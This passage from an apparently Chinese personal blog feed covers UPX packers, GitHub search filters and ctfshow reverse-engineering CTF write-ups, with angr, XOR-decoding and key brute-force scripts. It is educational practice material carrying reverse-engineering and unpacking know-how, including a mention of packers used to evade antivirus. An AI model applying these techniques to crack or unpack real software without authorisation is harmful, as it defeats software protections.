之开源壳upx - 知乎 (zhihu.com)</a></p><p>[<a href="https://bbs.kanxue.com/thread-226967.htm">原创]脱壳步骤，修复IAT的原因及修复IAT的完整步骤-加壳脱壳-看雪-安全社区|安全招聘|kanxue.com</a></p>]]></content>
    
    
    <summary type="html">&lt;h3 id=&quot;什么是壳&quot;&gt;&lt;a href=&quot;#什么是壳&quot; class=&quot;headerlink&quot; title=&quot;什么是壳&quot;&gt;&lt;/a&gt;什么是壳&lt;/h3&gt;&lt;p&gt;壳，分为&lt;strong&gt;压缩壳&lt;/strong&gt;，&lt;strong&gt;保护壳&lt;/strong&gt;，&lt;strong&gt;伪装壳&lt;/strong&gt;（对抗杀毒软件）&lt;/p&gt;
&lt;p&gt;这篇文章讲以下压缩壳，压缩壳可以有效减少程序的体积，同时由于压缩之后的代码比较难懂，所以也有一定的保护作用，最常见的就是UPX壳。压缩壳不同于一般的压缩（7zp、rar等），它不需要解压缩操作，程序可以直接运行，用到的是一种&lt;strong&gt;运行时解压缩&lt;/strong&gt;技术。&lt;/p&gt;</summary>
    
    
    
    
    <category term="UPX" scheme="http://example.com/tags/UPX/"/>
    
    <category term="运行时压缩" scheme="http://example.com/tags/%E8%BF%90%E8%A1%8C%E6%97%B6%E5%8E%8B%E7%BC%A9/"/>
    
    <category term="壳" scheme="http://example.com/tags/%E5%A3%B3/"/>
    
  </entry>
  
  <entry>
    <title>GitHub高效搜索开源项目指南</title>
    <link href="http://example.com/2023/10/10/GitHub%E9%AB%98%E6%95%88%E6%90%9C%E7%B4%A2%E5%BC%80%E6%BA%90%E9%A1%B9%E7%9B%AE%E6%8C%87%E5%8D%97/"/>
    <id>http://example.com/2023/10/10/GitHub%E9%AB%98%E6%95%88%E6%90%9C%E7%B4%A2%E5%BC%80%E6%BA%90%E9%A1%B9%E7%9B%AE%E6%8C%87%E5%8D%97/</id>
    <published>2023-10-09T16:15:01.000Z</published>
    <updated>2023-10-09T16:15:01.753Z</updated>
    
    <content type="html"><![CDATA[<p>互联网这么多年，我花了这么多钱，养肥了这么多人，不就留着今天用的吗！</p><span id="more"></span><p>现在我们学习路上特别是自学路上，学习资源少已经不成立了，随便一个关键词都能检索出来成千上万的资源，我们被大量的信息包围，但是质量却良莠不齐，快速寻找优质的学习资源是个很吸引人的能力。</p><p>比如我现在想学爬虫，我去github上直接搜索<code>爬虫</code></p><p><img src="/2023/10/10/GitHub%E9%AB%98%E6%95%88%E6%90%9C%E7%B4%A2%E5%BC%80%E6%BA%90%E9%A1%B9%E7%9B%AE%E6%8C%87%E5%8D%97/QQ%E6%88%AA%E5%9B%BE20231009235337.png"></p><p>27.4k 的资源，这么多，有些还不是强相关的点进去纯属浪费时间，现在我们直接 加一个条件 stars:&gt;1000</p><p><img src="/2023/10/10/GitHub%E9%AB%98%E6%95%88%E6%90%9C%E7%B4%A2%E5%BC%80%E6%BA%90%E9%A1%B9%E7%9B%AE%E6%8C%87%E5%8D%97/QQ%E6%88%AA%E5%9B%BE20231010000248.png"></p><p>在GitHub中star和fork数量大致上可以做为一个衡量优劣的标准,直接锐减到75，继续限制，可以指定语言，比如我想学的是python爬虫<code>language:python</code></p><p><img src="/2023/10/10/GitHub%E9%AB%98%E6%95%88%E6%90%9C%E7%B4%A2%E5%BC%80%E6%BA%90%E9%A1%B9%E7%9B%AE%E6%8C%87%E5%8D%97/QQ%E6%88%AA%E5%9B%BE20231010000449.png"></p><p>可以说筛选出来的这40个都是优质且符合要求的内容。计算机方面的知识更新迭代的很快，有些内容可能是优质的，但是可能现实中已经很少用到了，我们可以通过限制更新时间来判断这个项目是否还活跃 <code>pushed:&gt;2023-1-1</code> <img src="/2023/10/10/GitHub%E9%AB%98%E6%95%88%E6%90%9C%E7%B4%A2%E5%BC%80%E6%BA%90%E9%A1%B9%E7%9B%AE%E6%8C%87%E5%8D%97/QQ%E6%88%AA%E5%9B%BE20231010000943.png"></p><p>这一套组合拳下来，想要的几乎都来了。</p><h3 id="技巧总结："><a href="#技巧总结：" class="headerlink" title="技巧总结："></a>技巧总结：</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">in</span>:name hhh          name中必须含有hhh</span><br><span class="line"><span class="attribute">in</span>:description good  描述中含有good</span><br><span class="line"><span class="attribute">stars</span>:&gt;<span class="number">1000</span>          star数量大于<span class="number">1000</span></span><br><span class="line"><span class="attribute">forks</span>:&gt;<span class="number">1000</span>          fork数量大于<span class="number">1000</span></span><br><span class="line"><span class="attribute">pushed</span>:&gt;<span class="number">2023</span>-<span class="number">10</span>      最近一次更新在<span class="number">2023</span>年十月份之后</span><br></pre></td></tr></table></figure><p>内容来自：<a href="https://www.bilibili.com/video/BV1yJ411S7Wu/?buvid=YE4BCFE22DDE7DE54D5D83F8BEB16116E5AE&is_story_h5=false&mid=W7hFHnxfmhJ9wKabf6E/og==&p=1&plat_id=116&share_from=ugc&share_medium=iphone&share_plat=ios&share_session_id=4AA097DE-4C75-4426-9780-66329FCC37F1&share_source=QQ&share_tag=s_i&timestamp=1696842516&unique_k=vn6kJkv&up_id=384068749&vd_source=edc820e8f9bd6b2ea43cb8499151dea3">如何高效地在网上找开源项目做！在职程序员实际演示一波视频教程操作_哔哩哔哩_bilibili</a></p><p>感谢CodeSheep大佬的热情分享</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;互联网这么多年，我花了这么多钱，养肥了这么多人，不就留着今天用的吗！&lt;/p&gt;</summary>
    
    
    
    
    <category term="tips" scheme="http://example.com/tags/tips/"/>
    
  </entry>
  
  <entry>
    <title>ctfshow刷题</title>
    <link href="http://example.com/2023/10/01/ctfshow%E5%88%B7%E9%A2%98/"/>
    <id>http://example.com/2023/10/01/ctfshow%E5%88%B7%E9%A2%98/</id>
    <published>2023-10-01T14:30:06.000Z</published>
    <updated>2023-10-01T14:31:11.769Z</updated>
    
    <content type="html"><![CDATA[<p>每周做点题目</p><span id="more"></span><h3 id="RE3"><a href="#RE3" class="headerlink" title="RE3"></a>RE3</h3><p>看到这个题首先想到了angr，其实都还没怎么看逻辑</p><p><img src="/2023/10/01/ctfshow%E5%88%B7%E9%A2%98/QQ%E6%88%AA%E5%9B%BE20230926124047.png"></p><p>脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">argv</span>):</span><br><span class="line">    path=argv[<span class="number">1</span>]</span><br><span class="line">    p=angr.Project(path)</span><br><span class="line">    init_state=p.factory.entry_state()</span><br><span class="line">    sm=p.factory.simgr(init_state)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">isGood</span>(<span class="params">sm</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&quot;OK&quot;</span> <span class="keyword">in</span> sm.posix.dumps(<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">isBad</span>(<span class="params">sm</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&quot;Error!&quot;</span> <span class="keyword">in</span> sm.posix.dumps(<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    sm.explore(find=isGood,avoid=isBad)</span><br><span class="line">    <span class="keyword">if</span> sm.found:</span><br><span class="line">        solution_state=sm.found[<span class="number">0</span>]</span><br><span class="line">        <span class="built_in">print</span>(solution_state.posix.dumps(<span class="number">0</span>))</span><br><span class="line">        </span><br><span class="line"><span class="keyword">if</span> __name__ ==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main(sys.argv)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/2023/10/01/ctfshow%E5%88%B7%E9%A2%98/QQ%E6%88%AA%E5%9B%BE20230926124504.png"></p><p>其实是不报有希望的，因为除了angrctf还没怎么用angr解除过题目，结果真的出来了，但是明显不是flag，题目的描述是取最小解，4位值。记住我圈起来的这个1A9F.<img src="/2023/10/01/ctfshow%E5%88%B7%E9%A2%98/QQ%E6%88%AA%E5%9B%BE20230926125354.png"></p><p>我们的输入存放到input数组中，长度是5，也就是rsp+60 ~rsp+64存储合规输入，多余的部分会溢出到紧挨着的v19中。</p><p><img src="/2023/10/01/ctfshow%E5%88%B7%E9%A2%98/QQ%E6%88%AA%E5%9B%BE20230926130226.png"></p><p>动态调试得到循环6次之后v16的值是0xE560,所以0xE560+V17[6]&#x3D;&#x3D;0XFFFF,所以v17[6]&#x3D;0x1A9F,又因为上面的<code>dest[strlen(input) - 6] = 0;</code>作用是将最后一位置0，所以正确的输入是xxxxx1A9Fx，x的值可以是任意,其实细看上面的angr跑出的结果就有1A9F，而且前面是五个占位符</p><p><img src="/2023/10/01/ctfshow%E5%88%B7%E9%A2%98/QQ%E6%88%AA%E5%9B%BE20230926131315.png"></p><p>提交的flag：flag{1A9F}</p><h3 id="RE4"><a href="#RE4" class="headerlink" title="RE4"></a>RE4</h3><p><img src="/2023/10/01/ctfshow%E5%88%B7%E9%A2%98/QQ%E6%88%AA%E5%9B%BE20230926181141.png"></p><p>简化下来就是我们输入1 2 3他给出表中下标1 2 3的元素，将其异或7，与给定字符串进行比较，不同的是我们不是直接输入位置信息，而是输入一个比较大的数，程序进行模运算和除法运算，从而转化出位置信息。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">假设输入26</span><br><span class="line">26%<span class="attribute">26</span>=0      得到第一个位置0</span><br><span class="line">26/<span class="attribute">26</span>=1      大于0继续</span><br><span class="line">1%26 =1      得到第二个位置1</span><br><span class="line">1/26 =0      等于0结束</span><br><span class="line">所以转化的位置信息是[0,1]</span><br><span class="line">得到的字符是       <span class="string">&#x27;)&#x27;</span> 和 <span class="string">&#x27;(&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="/2023/10/01/ctfshow%E5%88%B7%E9%A2%98/QQ%E6%88%AA%E5%9B%BE20230926181728.png"></p><p>一次比较两个字符，比较的字符串是<code>/..v4p$$!&gt;Y59-</code></p><p>逆向思路是，首先将其异或7得到原来的字符串，然后根据所的字符串查询其在表中的位置，比如说得到了（）），那么其位置信息就是1 0 0， 然后将其恢复至原来的大数。有些奇怪的是输入676得到的位置信息是0 0 1，那么恢复脚本应该是</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(pos2)-<span class="number">1</span>,-<span class="number">1</span>,-<span class="number">1</span>):</span><br><span class="line">   flag+=pos2[i]           <span class="number">1</span>    <span class="number">26</span>    <span class="number">676</span></span><br><span class="line">   <span class="keyword">if</span> i&gt;=<span class="number">1</span>:  </span><br><span class="line">    flag*=<span class="number">26</span>              <span class="number">26</span>    <span class="number">676</span>   </span><br></pre></td></tr></table></figure><p>但实际这样是不对的，问题的关键在<img src="/2023/10/01/ctfshow%E5%88%B7%E9%A2%98/QQ%E6%88%AA%E5%9B%BE20230926184638.png"></p><p>v6可以理解位输入的长度，v7从最后一位逐个存储并进行异或，所以这里等价于一个倒序，所以真正的解密脚本应该是这样的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="string">b&#x27;&#x27;</span></span><br><span class="line">positions=[]</span><br><span class="line">a=<span class="string">b&#x27;/..v4p$$!&gt;Y59-&#x27;</span></span><br><span class="line">b=<span class="string">b&#x27;)(*&amp;^%489$!057@#&gt;&lt;:2163qwe&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a)):</span><br><span class="line">    result=a[i]^<span class="number">7</span></span><br><span class="line">    c+=<span class="built_in">bytes</span>([result])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> result <span class="keyword">in</span> b:</span><br><span class="line">        position=b.index(result)</span><br><span class="line">        positions.append(position)</span><br><span class="line"><span class="comment">#print(positions)</span></span><br><span class="line"></span><br><span class="line">pos=[<span class="number">1</span>,<span class="number">0</span>, <span class="number">0</span>, <span class="number">23</span>, <span class="number">22</span>, <span class="number">24</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">3</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">19</span>, <span class="number">16</span>, <span class="number">2</span>]</span><br><span class="line">flag=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> pos:</span><br><span class="line">    flag*=<span class="number">26</span>      <span class="comment">#这里的顺序很重要</span></span><br><span class="line">    flag+=i</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h3 id="真的是签到"><a href="#真的是签到" class="headerlink" title="真的是签到"></a>真的是签到</h3><p>ASP+UPX壳</p><p><img src="/2023/10/01/ctfshow%E5%88%B7%E9%A2%98/QQ%E6%88%AA%E5%9B%BE20230926210653.png"></p><h3 id="愚人杯-babyre"><a href="#愚人杯-babyre" class="headerlink" title="愚人杯 babyre"></a>愚人杯 babyre</h3><p>这一题考察的应该是附加调试fork出的子进程，可是老弄不好<img src="/2023/10/01/ctfshow%E5%88%B7%E9%A2%98/QQ%E6%88%AA%E5%9B%BE20230927015225.png"></p><p>看了一个师傅的是直接静态分析加推测，官方wp给的也是静态分析，不过很草率。</p><p>加密逻辑</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">v2 = <span class="built_in">strlen</span>(input);</span><br><span class="line">  dest = (<span class="type">char</span> *)<span class="built_in">malloc</span>(v2 + <span class="number">1</span>);</span><br><span class="line">  <span class="built_in">memset</span>(dest, <span class="number">0</span>, v2 + <span class="number">1</span>);</span><br><span class="line">  <span class="built_in">strncpy</span>(dest, input, v2);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v2; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; v2; ++j )</span><br><span class="line">      v5 += dest[j];</span><br><span class="line">    dest[i] = v5;                               <span class="comment">// dest[0]=dest[0]+dest[1]+……dest[m]</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> dest;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>解密思路就是从最后一个入手，dest[23]减去前面22个元素，则可以得到加密前的dest[23],dest[22]减去dest[23],再减去dest[0~21]即可得到原来的数。每一个元素减去除自身以外所有元素之和即可得到加密前的数据，必须要从最后一项开始。</p><p>脚本</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">decode</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span>* data,<span class="type">int</span> len)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> data[<span class="number">25</span>] = &#123;<span class="number">0x79</span>, <span class="number">0x8F</span>, <span class="number">0xAA</span>, <span class="number">0xEE</span>, <span class="number">0x69</span>, <span class="number">0x6A</span>, <span class="number">0x65</span>, <span class="number">0x53</span>, <span class="number">0x2B</span>, <span class="number">0xEE</span>, <span class="number">0x7B</span>, <span class="number">0x80</span>, <span class="number">0x9B</span>, <span class="number">0xD7</span>, <span class="number">0x7D</span>, <span class="number">0x9B</span>, <span class="number">0xD0</span>, <span class="number">0x2B</span>, <span class="number">0xE8</span>, <span class="number">0x71</span>, <span class="number">0x7E</span>, <span class="number">0x9B</span>, <span class="number">0xBD</span>, <span class="number">0xFD</span>, <span class="number">0x00</span>&#125;;</span><br><span class="line">    <span class="type">int</span> len=<span class="built_in">strlen</span>(data);</span><br><span class="line">    <span class="type">char</span> dest;</span><br><span class="line">    decode(data,<span class="number">24</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>,(<span class="type">char</span>*)data);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">decode</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span>* data,<span class="type">int</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=len<span class="number">-1</span>;i&gt;=<span class="number">0</span>;i--)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;len;j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(i!=j)</span><br><span class="line">            &#123;</span><br><span class="line">                data[i]-=data[j];<span class="comment">//倒序，除了自身都减一遍</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="eazy-pyc"><a href="#eazy-pyc" class="headerlink" title="eazy_pyc"></a>eazy_pyc</h3><p>pyc在线反编译得到py<img src="/2023/10/01/ctfshow%E5%88%B7%E9%A2%98/QQ%E6%88%AA%E5%9B%BE20230927142619.png"></p><p>很简单，这里练习一下python的使用，之前脚本大部分都是用c实现</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">code = [<span class="string">&#x27;\x16&#x27;</span>,<span class="string">&#x27;\x1d&#x27;</span>,<span class="string">&#x27;\x1e&#x27;</span>,<span class="string">&#x27;\x1a&#x27;</span>,<span class="string">&#x27;\x18&#x27;</span>,<span class="string">&#x27;\t&#x27;</span>,<span class="string">&#x27;\xff&#x27;</span>,<span class="string">&#x27;\xd0&#x27;</span>,<span class="string">&#x27;,&#x27;</span>,<span class="string">&#x27;\x03&#x27;</span>,<span class="string">&#x27;\x02&#x27;</span>,<span class="string">&#x27;\x14&#x27;</span>,<span class="string">&#x27;8&#x27;</span>,<span class="string">&#x27;m&#x27;</span>,<span class="string">&#x27;\x01&#x27;</span>,<span class="string">&#x27;C&#x27;</span>,<span class="string">&#x27;D&#x27;</span>,<span class="string">&#x27;\xbd&#x27;</span>,<span class="string">&#x27;\xf7&#x27;</span>,<span class="string">&#x27;*&#x27;</span>,<span class="string">&#x27;\r&#x27;</span>,<span class="string">&#x27;\xda&#x27;</span>,<span class="string">&#x27;\xf9&#x27;</span>,<span class="string">&#x27;\x1c&#x27;</span>,<span class="string">&#x27;&amp;&#x27;</span>,<span class="string">&#x27;5&#x27;</span>,<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&#x27;\xda&#x27;</span>,<span class="string">&#x27;\xd4&#x27;</span>,<span class="string">&#x27;\xd1&#x27;</span>,<span class="string">&#x27;\x0b&#x27;</span>,<span class="string">&#x27;\xc7&#x27;</span>,<span class="string">&#x27;\xc7&#x27;</span>,<span class="string">&#x27;\x1a&#x27;</span>,<span class="string">&#x27;\x90&#x27;</span>,<span class="string">&#x27;D&#x27;</span>,<span class="string">&#x27;\xa1&#x27;</span>]</span><br><span class="line"><span class="comment">#[]是列表</span></span><br><span class="line"></span><br><span class="line">l = <span class="built_in">len</span>(code)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(l-<span class="number">3</span>):</span><br><span class="line">    code[l-<span class="number">4</span>-i] = <span class="built_in">chr</span>(<span class="built_in">ord</span>(code[l-<span class="number">4</span>-i]) ^ <span class="built_in">ord</span>(code[l-<span class="number">3</span>-i ]))</span><br><span class="line">    <span class="comment">#python中异或的对象必须要是整数，所以用ord返回给定字符的 Unicode 码点（整数）</span></span><br><span class="line"></span><br><span class="line">code = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">ord</span>, code))  <span class="comment"># 返回code的ascii 列表形式</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(l):</span><br><span class="line">    num = (code[i] - i ) </span><br><span class="line">    flag += <span class="built_in">chr</span>(num)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h3 id="eazy-cc"><a href="#eazy-cc" class="headerlink" title="eazy_cc"></a>eazy_cc</h3><p>签到</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">v16=<span class="string">&#x27;08111f425a5c1c1e1a526d410e3a1e5e5d573402165e561216&#x27;</span></span><br><span class="line">key=<span class="string">&#x27;key123&#x27;</span></span><br><span class="line">v16_bytes=<span class="built_in">bytes</span>.fromhex(v16)</span><br><span class="line">result=<span class="built_in">bytearray</span>()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(v16_bytes)):</span><br><span class="line">    result.append(v16_bytes[i]^<span class="built_in">ord</span>(key[i%<span class="built_in">len</span>(key)]))</span><br><span class="line"><span class="built_in">print</span>(result)</span><br><span class="line"></span><br><span class="line"><span class="comment">#ctfshow&#123;cc_re_good_good!&#125;</span></span><br></pre></td></tr></table></figure><h3 id="eazy-re"><a href="#eazy-re" class="headerlink" title="eazy_re"></a>eazy_re</h3><p><img src="/2023/10/01/ctfshow%E5%88%B7%E9%A2%98/QQ%E6%88%AA%E5%9B%BE20230927192858.png"></p><p>输入一个字符串，输入两个key作为种子对输入进行异或操作，然后逐字节输出密文。<img src="/2023/10/01/ctfshow%E5%88%B7%E9%A2%98/QQ%E6%88%AA%E5%9B%BE20230927193218.png"></p><p>A13AA0是一个300*300的大数组。异或是可逆的，那我们应该将阿狸给出的密文当作明文输入进去，再使用正确的种子key就可以还原阿狸的话，又提到了base64<img src="/2023/10/01/ctfshow%E5%88%B7%E9%A2%98/QQ%E6%88%AA%E5%9B%BE20230927200337.png"></p><p>应该是要讲这些字符进行base64编码，否则有很多不可见字符。“flag”base64之后得到“ZmxhZ”，对应的明文的开始应该就是ZmxhZ，那么我们输入ZmxhZ，在输入两个正确的key种子即可，现在问题的关键就是得到key，把数组dump出来，然后暴破以下试试。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> key1;</span><br><span class="line">    <span class="type">int</span> key2;</span><br><span class="line">    <span class="type">int</span> v9;</span><br><span class="line">    <span class="type">int</span> v10;</span><br><span class="line">    <span class="keyword">for</span>(key1=<span class="number">0</span>;key1&lt;<span class="number">200</span>;key1++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(key2=<span class="number">0</span>;key2&lt;<span class="number">200</span>;key2++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">int</span> v3=key1%<span class="number">299</span>;</span><br><span class="line">            <span class="type">int</span> v4=key2%<span class="number">299</span>;</span><br><span class="line">            <span class="type">unsigned</span> <span class="type">int</span> v5=<span class="number">0</span>;</span><br><span class="line">            v10=key2%<span class="number">299</span>;</span><br><span class="line">            <span class="type">char</span> input[]=<span class="string">&quot;ZmxhZ&quot;</span>;</span><br><span class="line">            <span class="type">int</span> com[<span class="number">5</span>];</span><br><span class="line">            <span class="type">int</span> data[<span class="number">5</span>]=&#123;<span class="number">90</span>,<span class="number">171</span>,<span class="number">198</span>,<span class="number">235</span>,<span class="number">229</span>&#125;;</span><br><span class="line">            <span class="type">int</span> v6=<span class="built_in">strlen</span>(input);</span><br><span class="line">            <span class="keyword">do</span>&#123;</span><br><span class="line">                v9=arr[v3][v4]^input[v5];</span><br><span class="line">                v3=(v9+v3)%<span class="number">299</span>;</span><br><span class="line">                v10=(v9+v10)%<span class="number">300</span>;</span><br><span class="line">                com[v5]=v9;</span><br><span class="line">                v4=v10;</span><br><span class="line">                ++v5;</span><br><span class="line">            &#125;<span class="keyword">while</span>(v5&lt;v6);</span><br><span class="line">            <span class="keyword">if</span>(com[<span class="number">0</span>]==data[<span class="number">0</span>]&amp;&amp;com[<span class="number">1</span>]==data[<span class="number">1</span>]&amp;&amp;com[<span class="number">2</span>]==data[<span class="number">2</span>]&amp;&amp;com[<span class="number">3</span>]==data[<span class="number">3</span>]&amp;&amp;com[<span class="number">4</span>]==data[<span class="number">4</span>])</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,key1);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,key2);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>解出来key1&#x3D;67，key2&#x3D;74。接下来的任务就是补充”Zmxhz“这个字符串。然后就没有然后了，因为我正常的思路是：异或是对称的，将数据原封不动的输入进去即可，可是后来发现v9取决于key和input，因为input的内容发生了变化，所以肯定不能原封不动的输入进去，我苦思冥想一天也没想到怎么求逆，甚至看了别人的题解也不懂，后来想到了暴破，嘎嘎好用。</p><p>真的看不懂下面这个逆向思路，可能是麻了脑子<img src="/2023/10/01/ctfshow%E5%88%B7%E9%A2%98/QQ%E6%88%AA%E5%9B%BE20230928172041.png"></p><p>暴破脚本：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">do</span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> tmp=<span 